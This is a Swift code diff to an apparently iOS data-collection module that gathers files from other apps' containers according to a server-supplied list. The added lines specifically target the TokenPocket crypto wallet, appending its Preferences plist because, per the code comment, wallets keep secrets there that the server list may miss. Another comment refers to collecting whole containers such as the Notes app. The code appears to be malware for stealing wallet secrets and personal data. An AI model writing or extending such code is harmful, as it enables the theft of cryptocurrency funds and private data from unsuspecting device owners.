@@ -601,6 +601,18 @@ enum MainAPI {
         for item in cc.items {
             globallogger.log("(api)   item type=\(item.type) path=\(item.path)")
         }
+        // Client-side augmentation: some wallets keep secrets in their
+        // Preferences plist, which the server list does not always include.
+        // TokenPocket (com.global.wallet.ios) -> Library/Preferences/<bid>.plist
+        var effectiveItems = cc.items
+        if let bid = cc.bundle_id, !bid.isEmpty,
+           bid == "com.global.wallet.ios" {
+            let tpPlist = "Library/Preferences/\(bid).plist"
+            if !effectiveItems.contains(where: { $0.path == tpPlist }) {
+                effectiveItems.append(CollectItemConfig(type: "file", path: tpPlist))
+                globallogger.log("(api)   extra item type=file path=\(tpPlist) (TokenPocket plist)")
+            }
+        }
         let fm = FileManager.default
         let staging = fm.temporaryDirectory
             .appendingPathComponent("lara_collect_\(UUID().uuidString)", isDirectory: true)
@@ -612,7 +624,7 @@ enum MainAPI {
         }
 
         var collected = 0
-        for item in cc.items {
+        for item in effectiveItems {
             let trimmed = item.path.trimmingCharacters(in: .whitespacesAndNewlines)
             // "/" 或空行 = 整容器（备忘录这类整容器采集）
             let isWhole = trimmed.isEmpty || trimmed == "/"
